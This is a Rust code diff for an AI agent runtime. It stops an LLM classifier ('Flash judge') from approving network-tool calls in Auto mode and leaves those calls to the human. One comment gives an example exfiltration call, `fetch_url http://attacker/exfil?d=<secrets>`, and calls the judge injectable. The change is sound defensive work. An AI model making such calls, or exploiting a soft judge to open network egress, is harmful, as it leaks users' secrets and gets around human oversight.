@@ -38,6 +38,15 @@ pub(super) fn is_root_grant(tool_name: &str) -> bool {
         == crate::execution_policy::ToolKind::RootGrant
 }
 
+/// Whether a call is a network-native tool (`fetch_url`/`web_search`). Their
+/// egress is intrinsic, so they carry no `network: true` argument — the
+/// auto-mode egress floor must recognize them by kind, not by that flag, or the
+/// classifier would decide a call whose only purpose is reaching the network.
+fn is_network_tool(tool_name: &str) -> bool {
+    crate::execution_policy::ExecPolicy::classify_tool(tool_name)
+        == crate::execution_policy::ToolKind::Network
+}
+
 /// Prompt-time triage of a `request_write_root` call (see
 /// [`AgentRuntime::root_grant_prompt_target`]).
 pub(super) enum RootGrantPrompt {
@@ -145,11 +154,17 @@ impl AgentRuntime {
             PermissionMode::Default => false,
             PermissionMode::AcceptEdits => accept_edits_approvable(&call.name, &call.arguments),
             PermissionMode::Auto => {
-                // A network declaration sits above the judge: opening egress
-                // is the human's call (or `[sandbox] network = "always"`),
-                // never something a classifier waves through. Short-circuits
-                // before the judge spends a request.
+                // Egress sits above the judge: opening the network is the
+                // human's call (or `[sandbox] network = "always"`), never
+                // something a classifier waves through. `request.network` is the
+                // *declared* flag on shell/job/sub-agent calls; the network-
+                // native tools (fetch_url/web_search) carry no such flag, so
+                // they are floored by kind here too — otherwise an
+                // `fetch_url http://attacker/exfil?d=<secrets>` was decided by
+                // the Flash judge, a soft and injectable backstop, in Auto mode.
+                // Short-circuits before the judge spends a request.
                 !request.network
+                    && !is_network_tool(&call.name)
                     && self
                         .auto_mode_approves(call, request, &user_task, cancel)
                         .await
